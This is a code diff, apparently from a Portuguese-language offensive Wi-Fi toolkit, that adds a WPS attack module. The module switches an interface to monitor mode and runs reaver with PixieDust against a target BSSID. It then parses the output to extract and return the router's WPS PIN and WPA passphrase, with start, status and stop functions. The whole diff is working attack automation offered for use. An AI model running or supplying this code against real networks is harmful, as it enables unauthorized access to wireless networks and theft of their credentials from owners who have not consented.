@@ -611,6 +611,67 @@ def _kill_proc(p):
             except Exception:
                 pass
 
+# ---------------- WPS attack (reaver PixieDust + PIN) ----------------
+_wps = {"proc": None, "log": f"{WORK}/wps.log", "bssid": None, "iface": None}
+
+
+def _wps_log_tail(n=40):
+    try:
+        with open(_wps["log"], errors="replace") as f:
+            return "".join(f.readlines()[-n:])
+    except OSError:
+        return ""
+
+
+def _wps_parse():
+    import re
+    txt = _wps_log_tail(200)
+    pin = psk = None
+    m = re.search(r"WPS PIN:\s*.?(\d{4,8})", txt)
+    if m:
+        pin = m.group(1)
+    m = re.search(r"WPA PSK:\s*.([^']+)", txt)
+    if m:
+        psk = m.group(1)
+    done = ("WPS PIN:" in txt) or ("WPA PSK:" in txt)
+    return pin, psk, done
+
+
+def wps_attack_start(bssid, channel, iface=None, essid=None):
+    if not _which("reaver"):
+        return {"ok": False, "error": "reaver nao instalado (apt install reaver)"}
+    if not bssid:
+        return {"ok": False, "error": "bssid obrigatorio"}
+    if _wps["proc"] and _wps["proc"].poll() is None:
+        return {"ok": False, "error": "ataque WPS ja rodando"}
+    iface = iface or DEFAULT_RADIO
+    try:
+        os.remove(_wps["log"])
+    except OSError:
+        pass
+    _set_monitor(iface)
+    ch = ("-c %d " % int(channel)) if channel else ""
+    cmd = "reaver -i %s -b %s %s-K 1 -N -vv -d 2 -T 5 -r 3:15 -l 60 > %s 2>&1" % (iface, bssid, ch, _wps["log"])
+    _wps["proc"] = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
+    _wps["bssid"] = bssid
+    _wps["iface"] = iface
+    return {"ok": True, "msg": "ataque WPS iniciado (PixieDust)", "bssid": bssid, "iface": iface}
+
+
+def wps_attack_status():
+    running = bool(_wps["proc"] and _wps["proc"].poll() is None)
+    pin, psk, done = _wps_parse()
+    return {"ok": True, "rodando": running, "pin": pin, "psk": psk, "sucesso": done, "bssid": _wps["bssid"], "log": _wps_log_tail(30)}
+
+
+def wps_attack_stop():
+    _kill_proc(_wps["proc"])
+    _wps["proc"] = None
+    iface = _wps["iface"] or DEFAULT_RADIO
+    _cleanup_iface(iface)
+    _set_managed(iface)
+    pin, psk, done = _wps_parse()
+    return {"ok": True, "msg": "ataque WPS parado", "pin": pin, "psk": psk, "sucesso": done}
 
 def capture_stop():
     _kill_proc(_capture.get("deauth"))
